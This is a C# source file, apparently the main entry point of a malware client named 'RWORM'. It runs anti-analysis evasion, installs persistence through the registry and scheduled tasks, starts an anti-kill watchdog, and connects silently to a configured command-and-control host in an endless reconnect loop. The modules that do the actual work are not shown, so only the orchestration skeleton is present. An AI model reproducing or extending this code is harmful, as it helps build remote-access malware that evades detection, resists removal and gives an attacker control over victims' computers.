using System;
using System.Threading;
using System.Threading.Tasks;
using RWORM.Client.Core;
using RWORM.Client.Modules;
using RWORM.Client.Network;

namespace RWORM.Client
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            // If executed in watchdog mode, run dedicated supervision loop and return
            if (args.Length >= 2 && args[0] == "--watchdog")
            {
                Watchdog.RunWatchdogMode(args);
                return;
            }

            // Evasion / Anti-Analysis checks
            Evasion.Run();

            // Persistence installation (Registry / Scheduled Tasks)
            Persistence.Install();

            // Mutual Anti-Kill Watchdog guardian
            Watchdog.InitializeWatchdog();

            // No-console: WinExe entry point, no Console.* calls.
            var connector = new Connector();

            // Keep process alive; reconnect loop runs inside Connector.
            using var exitEvent = new ManualResetEventSlim(false);

            connector.ConnectAsync(Config.C2Host, Config.C2Port)
                     .ContinueWith(t =>
                     {
                         // ConnectAsync failed fatally — wait then retry handled inside
                     });

            exitEvent.Wait(); // block forever; Connector manages reconnect internally
        }
    }
}
